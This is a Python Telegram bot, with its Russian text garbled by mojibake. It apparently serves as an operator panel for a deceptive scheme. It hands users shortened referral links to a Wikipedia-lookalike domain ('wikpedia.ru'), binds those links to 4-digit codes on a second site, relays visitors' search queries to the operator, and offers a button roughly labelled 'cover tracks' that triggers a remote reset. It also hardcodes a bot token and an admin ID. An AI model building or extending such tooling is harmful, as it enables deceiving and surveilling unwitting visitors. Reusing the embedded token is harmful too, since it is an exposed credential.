from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
import logging
import aiohttp

BOT_TOKEN = "7953140297:AAGwWVx3zwmo-9MbQ-UUU1764nljCxuncQU"
BASE_SITE_URL = "https://wikpedia.ru"
AUTHORIZED_USERS_FILE = "authorized_users.txt"
ADMIN_ID = 132588075  # –¢–≤–æ–π ID

logging.basicConfig(level=logging.INFO)

# –ó–∞–≥—Ä—É–∑–∫–∞ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏–∑ —Ñ–∞–π–ª–∞
def load_authorized_users(filename=AUTHORIZED_USERS_FILE):
    try:
        with open(filename, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        logging.warning(f"{filename} –Ω–µ –Ω–∞–π–¥–µ–Ω, —Å–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –ø—É—Å—Ç.")
        return set()

AUTHORIZED_USERS = load_authorized_users()


async def allow_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("üö´ –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
        return
    
    if not context.args:
        await update.message.reply_text("–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /allow <user_id>")
        return
    
    try:
        user_id_to_add = int(context.args[0])
    except ValueError:
        await update.message.reply_text("ID –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º.")
        return
    
    # –î–æ–±–∞–≤–ª—è–µ–º –≤ —Ñ–∞–π–ª, –µ—Å–ª–∏ –µ—â—ë –Ω–µ—Ç
    if user_id_to_add in AUTHORIZED_USERS:
        await update.message.reply_text(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id_to_add} —É–∂–µ –≤ —Å–ø–∏—Å–∫–µ.")
        return
    
    with open(AUTHORIZED_USERS_FILE, "a") as f:
        f.write(f"{user_id_to_add}\n")
    
    AUTHORIZED_USERS.add(user_id_to_add)
    await update.message.reply_text(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id_to_add} –¥–æ–±–∞–≤–ª–µ–Ω –≤ —Å–ø–∏—Å–æ–∫ —Ä–∞–∑—Ä–µ—à—ë–Ω–Ω—ã—Ö.")


# –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞
async def check_access(update: Update):
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("üö´ –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ –±–æ—Ç—É.")
        return False
    return True

# –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, text="üì≤ –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é:"):
    if not await check_access(update):
        return
    keyboard = [
        [KeyboardButton("üîó –ú–æ—è —Å—Å—ã–ª–∫–∞"), KeyboardButton("üîÑ –ö–æ–Ω—Ü—ã –≤ –≤–æ–¥—É")],
        [KeyboardButton("üî¢ –í–≤–µ—Å—Ç–∏ –∫–æ–¥"), KeyboardButton("üßÆ –ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä")],
	[KeyboardButton("üÜî –ú–æ–π ID")]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(text, reply_markup=reply_markup)

# –ö–æ–º–∞–Ω–¥–∞ /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    await show_main_menu(update, context)


async def shorten_url(long_url: str) -> str:
    api_url = f"https://clck.ru/--?url={long_url}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as resp:
                if resp.status == 200:
                    short_url = await resp.text()
                    if short_url.startswith("http"):
                        return short_url.strip()
                    else:
                        logging.error(f"[SHORTEN_URL] –ù–µ–æ–∂–∏–¥–∞–Ω–Ω—ã–π –æ—Ç–≤–µ—Ç –æ—Ç clck.ru: {short_url}")
                else:
                    logging.error(f"[SHORTEN_URL] –û—à–∏–±–∫–∞ HTTP {resp.status} –ø—Ä–∏ –∑–∞–ø—Ä–æ—Å–µ clck.ru")
    except Exception as e:
        logging.error(f"[SHORTEN_URL] –ò—Å–∫–ª—é—á–µ–Ω–∏–µ –ø—Ä–∏ —Å–æ–∫—Ä–∞—â–µ–Ω–∏–∏ URL: {e}")
    return long_url  # fallback, –µ—Å–ª–∏ —á—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫


# –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–æ–∫ –º–µ–Ω—é
async def handle_menu_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return
    text = update.message.text

    if text == "üîó –ú–æ—è —Å—Å—ã–ª–∫–∞":
        user_id = update.effective_user.id
        ref_link = f"{BASE_SITE_URL}?ref={user_id}"
        short_link = await shorten_url(ref_link)

        await update.message.reply_text(
            f"üîó –í–∞—à–∞ —Å—Å—ã–ª–∫–∞:\n{short_link}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("üåê –ü–µ—Ä–µ–π—Ç–∏", url=short_link)]
            ])
        )


    elif text == "üîÑ –ö–æ–Ω—Ü—ã –≤ –≤–æ–¥—É":
        user_id = update.effective_user.id
        async with aiohttp.ClientSession() as session:
            check_url = f"{BASE_SITE_URL}/check_reset_key?ref={user_id}"
            async with session.get(check_url) as resp:
                if resp.status != 200:
                    await update.message.reply_text("‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è.")
                    return
                data = await resp.json()
                if not data.get('exists'):
                    await update.message.reply_text("‚ùå –ù–µ—á–µ–≥–æ —É–¥–∞–ª—è—Ç—å")
                    return

            async with session.get(f"{BASE_SITE_URL}/trigger_reset?ref={user_id}") as resp:
                if resp.status == 200:
                    await update.message.reply_text("‚úÖ –ú–æ–º–µ–Ω—Ç...")
                else:
                    await update.message.reply_text("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∑–≤–∞—Ç—å —Å–±—Ä–æ—Å")

    elif text == "üî¢ –í–≤–µ—Å—Ç–∏ –∫–æ–¥":
        context.user_data["awaiting_code"] = True
        await update.message.reply_text("üî¢ –í–≤–µ–¥–∏—Ç–µ 4-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥:")


    elif text == "üÜî –ú–æ–π ID":
    	user_id = update.effective_user.id
    	await update.message.reply_text(f"üÜî –í–∞—à Telegram ID: `{user_id}`", parse_mode="Markdown")


    elif text == "üßÆ –ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä":
    	user_id = update.effective_user.id
    	link = f"wikicounter.ru/calculator?ref={user_id}"
    	await update.message.reply_text(
        	"üßÆ –í–∞—à –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä:",
        	reply_markup=InlineKeyboardMarkup([
            		[InlineKeyboardButton("–û—Ç–∫—Ä—ã—Ç—å –∫–∞–ª—å–∫—É–ª—è—Ç–æ—Ä", url=link)]
        	])
    	)


# –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ –∫–æ–¥–∞
async def handle_code_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    # –ï—Å–ª–∏ –Ω–µ –∂–¥—ë–º –∫–æ–¥ ‚Äî –∏–≥–Ω–æ—Ä–∏—Ä—É–µ–º
    if not context.user_data.get("awaiting_code"):
        return

    text = update.message.text

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –∫–æ–¥–∞
    if not text.isdigit() or len(text) != 4:
        await update.message.reply_text("‚ùå –í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π 4-–∑–Ω–∞—á–Ω—ã–π –∫–æ–¥.")
        return

    user_id = update.effective_user.id
    ref_link = f"{BASE_SITE_URL}?ref={user_id}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://wikicounter.ru/update_code",
                json={"code": text, "new_url": ref_link}
            ) as resp:
                data = await resp.json()
                if data.get("status") == "success":
                    await update.message.reply_text("‚úÖ –ö–æ–¥ –Ω–∞–π–¥–µ–Ω, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Å–≤—è–∑—å...")
                else:
                    await update.message.reply_text("‚ùå –ö–æ–¥ –Ω–µ –Ω–∞–π–¥–µ–Ω.")
    except Exception as e:
        logging.error(f"Error updating code: {e}")
        await update.message.reply_text("‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ")

    context.user_data["awaiting_code"] = False


# –õ–æ–≥–∏ —Å –∫–Ω–æ–ø–∫–æ–π —Å–±—Ä–æ—Å–∞
async def send_log(context: ContextTypes.DEFAULT_TYPE, user_id: int, query_text: str):
    await context.bot.send_message(
        chat_id=user_id,
        text=f"üîî –ù–æ–≤—ã–π –ø–æ–∏—Å–∫!\n–ó–∞–ø—Ä–æ—Å: {query_text}",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("üîÑ –°–±—Ä–æ—Å–∏—Ç—å", callback_data=f"reset_user_{user_id}")]
        ])
    )


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # –ö–æ–º–∞–Ω–¥—ã
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", show_main_menu))
    
    app.add_handler(CommandHandler("allow", allow_user))

    # –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π (–≤–∞–∂–µ–Ω –ø–æ—Ä—è–¥–æ–∫!)
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.Regex(r'^(üîó –ú–æ—è —Å—Å—ã–ª–∫–∞|üîÑ –ö–æ–Ω—Ü—ã –≤ –≤–æ–¥—É|üî¢ –í–≤–µ—Å—Ç–∏ –∫–æ–¥|üßÆ –ö–∞–ª—å–∫—É–ª—è—Ç–æ—Ä|üÜî –ú–æ–π ID)$')
, handle_menu_buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_code_input))
    
    app.run_polling()

if __name__ == "__main__":
    main()


